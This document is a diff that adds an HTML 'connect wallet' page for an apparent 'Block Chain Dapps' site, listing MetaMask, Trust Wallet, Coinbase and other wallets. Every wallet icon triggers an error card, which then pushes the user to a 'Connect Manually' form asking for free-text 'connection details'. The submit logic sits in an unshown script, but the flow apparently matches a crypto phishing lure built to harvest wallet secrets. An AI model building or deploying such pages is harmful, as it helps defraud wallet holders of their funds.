@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" />
+
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="../home/home.css">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link rel="shortcut icon" href="../img icons/nature.png" type="image/x-icon">
+
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400..900&display=swap" rel="stylesheet">
+
+    <script src="login.js"></script>
+
+    <link rel="stylesheet" href="login.css">
+
+</head>
+
+<style>
+    @media screen and (max-width: 576px) {
+
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --header-font: "Orbitron", sans-serif;
+            --text-font: "Roboto Flex", sans-serif;
+        }
+
+        .wallet {
+            padding: 1rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            row-gap: 4rem !important;
+            margin-top: 2rem;
+        }
+
+
+
+        .wallet-box {
+            width: 100%;
+            height: 10vh;
+            /* border: 2px solid white; */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+
+        .wallet-box img {
+            /* border: 2px solid white; */
+            border-radius: 50%;
+            width: 40%;
+            object-fit: cover;
+        }
+
+        .wallet-box p {
+            text-transform: capitalize;
+            font-size: 12px;
+            margin-top: 0.5rem;
+            color: white;
+            font-family: var(--text-font);
+        }
+
+
+        .header {
+            height: 30vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+
+        .header input {
+            margin-top: 1rem;
+            padding: 0.8rem 0rem;
+            width: 90%;
+            text-align: center;
+            outline: none;
+
+        }
+
+
+        .header h1 {
+            color: white;
+            text-transform: capitalize;
+            font-size: 40px;
+            font-family: var(--header-font);
+            margin-top: 2rem;
+
+        }
+
+        .header p {
+            color: white;
+            text-transform: capitalize;
+            font-size: 16px;
+            letter-spacing: 0.1em;
+            margin-top: 1em;
+            font-family: var(--text-font);
+
+        }
+
+        .header img {
+            margin-top: 2rem;
+        }
+    }
+</style>
+
+
+
+<body>
+
+
+    <section class="header">
+
+        <img src="../img icons/nature.png" width="40" alt="">
+        <h1>connect wallet</h1>
+        <p>please connect your wallet to continue</p>
+        <input type="text" placeholder="search wallet name">
+
+
+    </section>
+
+
+    <section class="wallet">
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/metamask-icon.png" alt="metamask icon">
+            <p>metamask</p>
+
+        </div>
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/safepal-icon.png" alt="safepal icon">
+            <p>safepal</p>
+
+        </div>
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/casperwallet-icon.png" alt="Casper wallet icon">
+            <p>Casper wallet</p>
+
+        </div>
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/nova-wallet-icon.jpeg" alt="nova wallet icon">
+            <p>Nova wallet</p>
+
+        </div>
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/trustwallet-icon.jpeg" alt="trustwallet icon">
+            <p>Trust wallet</p>
+
+        </div>
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/tron-wallet-icon.png" alt="tron-wallet-icon">
+            <p>tron wallet</p>
+
+        </div>
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/coinbase-icon.png" alt="coinbase-icon">
+            <p>coinbase wallet</p>
+
+        </div>
+
+        <div class="wallet-box">
+
+            <img onclick="showErrorCard()" src="../img icons/safemoon-wallet-icon.jpeg" alt="safemoon-wallet-icon">
+            <p>safemoon wallet</p>
+
+        </div>
+
+    </section>
+
+
+
+    <div class="card-overlay" id="cardOverlay">
+        <div class="error-card">
+            <div class="card-header">
+                <h3 id="cardTitle">Connection Status</h3>
+                <button class="close-btn" onclick="hideErrorCard()">&times;</button>
+            </div>
+
+            <div class="card-body">
+                <!-- Error Page -->
+                <div id="errorPage" class="error-page">
+                    <div class="error-icon">
+                        <div class="loading" id="loadingSpinner"></div>
+                        <span id="errorSymbol" style="display: none; color: white; font-size: 24px;">⚠️</span>
+                    </div>
+                    <div class="error-message" id="errorMessage">Initializing connection...</div>
+                    <button class="connect-btn" id="connectBtn" onclick="showManualConnection()" style="display: none;">
+                        Connect Manually
+                    </button>
+                </div>
+
+                <!-- Manual Connection Page -->
+                <div id="manualPage" class="manual-connection">
+                    <button class="back-btn" onclick="showErrorPage()">← Back</button>
+                    <h4 style="margin-bottom: 20px; color: #333;">Manual Connection Setup</h4>
+
+                    <form onsubmit="handleManualSubmit(event)">
+
+                        <div class="form-group">
+                            <label class="form-label" for="connectionMessage">Connection Details:</label>
+                            <textarea class="form-input" id="connectionMessage"
+                                placeholder="Enter your connection details, server URL, or any specific configuration..."
+                                required></textarea>
+                        </div>
+
+                        <button type="submit" class="submit-btn" id="submitBtn">
+                            Connect Now
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <footer>
+
+
+
+
+
+
+
+        <p>&copy; 2024 Block Chain Dapps. All rights reserved.</p> <br>
+
+        <a href="">terms of service</a>&nbsp; <a href="">privacy policy</a>
+
+
+    </footer>
+
+
+
+
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+
+    <script>
+        AOS.init();
+    </script>
+
+</body>
+
+</html>
